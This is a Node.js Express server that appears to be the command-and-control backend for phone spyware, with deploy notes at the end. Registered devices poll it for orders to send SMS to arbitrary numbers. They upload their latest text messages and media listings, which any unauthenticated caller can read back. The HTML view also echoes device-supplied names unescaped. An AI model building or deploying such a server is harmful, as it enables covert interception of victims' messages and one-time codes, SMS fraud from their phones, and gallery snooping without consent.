const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(cors());
app.use(express.json());

/**
 * In-memory store
 */
const devices = {};   // deviceId -> { deviceId, model, registeredAt }
const commands = {};  // deviceId -> [ { id, number, message } ]
const smsData = {};   // deviceId -> latest 10 SMS
const pending = {};   // deviceId -> true for media requests
const lastMedia = {}; // deviceId -> latest media list

// ------------------ Device Registration ------------------
app.post("/register", (req, res) => {
    const { deviceId, model } = req.body;
    if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });

    devices[deviceId] = { deviceId, model: model || "unknown", registeredAt: new Date() };
    if (!commands[deviceId]) commands[deviceId] = [];
    if (!smsData[deviceId]) smsData[deviceId] = [];

    res.json({ success: true });
});

// ------------------ Fetch all devices ------------------
app.get("/fetch", (req, res) => {
    res.json(Object.values(devices));
});

// ------------------ Send SMS command to device ------------------
app.post("/sendsms", (req, res) => {
    const { deviceId, number, message } = req.body;

    if (!devices[deviceId]) return res.status(404).json({ success: false, error: "Device not found" });

    const cmd = { id: uuidv4(), number, message };
    commands[deviceId].push(cmd);

    res.json({ success: true, command: cmd });
});

// ------------------ Device polls for commands ------------------
app.get("/commands", (req, res) => {
    const { deviceId } = req.query;
    if (!commands[deviceId]) return res.json([]);

    const pendingCmds = commands[deviceId];
    commands[deviceId] = []; // clear after sending
    res.json(pendingCmds);
});

// ------------------ Device sends latest SMS ------------------
app.post("/smsread", (req, res) => {
    const { deviceId, sms } = req.body;
    if (!deviceId || !sms) return res.status(400).json({ success: false, error: "deviceId or sms missing" });

    smsData[deviceId] = sms; // store latest 10 SMS
    res.json({ success: true });
});

// ------------------ Fetch latest SMS of a device ------------------
app.post("/get-sms", (req, res) => {
    const { deviceId } = req.body;
    if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });

    res.json(smsData[deviceId] || []);
});

// ------------------ Media Request / Live Media ------------------
app.get('/request/:deviceId', (req, res) => {
    pending[req.params.deviceId] = true;
    res.send('REQUEST_SENT');
});

app.get('/poll', (req, res) => {
    const id = req.query.deviceId;
    if (pending[id]) { delete pending[id]; res.send('REQUEST'); }
    else res.send('WAIT');
});

app.post('/media/:deviceId', (req, res) => {
    lastMedia[req.params.deviceId] = req.body; // LIST ONLY (no files)
    res.send('OK');
});

// ------------------ JSON endpoint for gallery ------------------
app.get('/media-json/:deviceId', (req, res) => {
    const id = req.params.deviceId;
    res.json(lastMedia[id] || []);
});

// ------------------ HTML list view ------------------
app.get('/', (req, res) => {
    let html = `<h2>Live Media List</h2>`;
    for (const id in lastMedia) {
        html += `<h3>Device: ${id}</h3><ul>`;
        lastMedia[id].forEach(m => html += `<li>${m.name} (${m.type})</li>`);
        html += `</ul>`;
    }
    res.send(html);
});

// ------------------ Start server ------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

/* ============================ RENDER DEPLOY ============================ */
// Build: npm install
// Start: node index.js
// Port: 3000
